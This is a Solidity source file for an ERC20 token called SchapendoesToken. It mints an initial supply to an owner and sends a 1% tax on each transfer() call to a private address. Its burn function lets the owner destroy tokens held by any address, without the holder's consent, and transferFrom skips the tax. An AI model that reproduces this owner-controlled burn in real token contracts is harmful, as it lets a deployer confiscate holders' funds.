// SPDX-License-Identifier: MIT

pragma solidity 0.8.4;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract SchapendoesToken is ERC20, Ownable {

    address private taxAddress;

    constructor(
        string memory name,
        string memory symbol,
        uint256 initialSupply,
        address owner,
        address newTaxAddress
    ) public ERC20(name, symbol) {
        taxAddress = newTaxAddress;
        _mint(owner, initialSupply * (10**18));
    }

    function burn(address _from, uint _amount) public onlyOwner  {
        _burn(_from, _amount);
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        uint256 amountAfterTax = amount * 99 / 100;
        uint256 tax = amount - amountAfterTax;
        _transfer(_msgSender(), taxAddress, tax);
        _transfer(_msgSender(), recipient, amountAfterTax);
        return true;
    }


}
